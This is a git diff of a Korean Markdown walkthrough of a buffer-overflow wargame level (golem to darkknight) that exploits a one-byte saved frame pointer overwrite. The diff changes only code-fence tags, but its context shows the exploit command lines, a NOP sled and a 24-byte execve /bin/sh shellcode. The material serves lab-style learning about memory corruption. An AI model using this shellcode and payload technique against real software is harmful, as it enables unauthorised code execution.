@@ -53,7 +53,7 @@ SPF의 1바이트를 변경시키면 근처 스택 주소로 SFP를 변조 시�
 
 실제 올라가게 되는 problem_child의 buffer배열 주소를 구해보자.
 
-```sh
+```
 [golem@localhost golem]$ ./aarkknight `python -c 'print "A"*4+"S"*36+"\x80"'`
 AAAASSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS?퓹? ♠?왠?옹   ♥@☻
 Segmentation fault (core dumped)
@@ -100,7 +100,7 @@ problem_child의 buffer배열의 시작주소는 `0xbffffc84`로 확인되고 �
 shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
 ```
 
-```sh
+```
 [golem@localhost golem]$ ./darkknight `python -c 'print "\x88\xfc\xff\xbf"+"\x90"*12+"\x31\xc0\x50\x68\x2f\x2f\x73\x 68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x80"'`
 덡퓧릱릱릱릱릱?픐h//shh/bin됥PS됣솻
                                      ??퓹?  ♠?왠?옹    ♥@☻
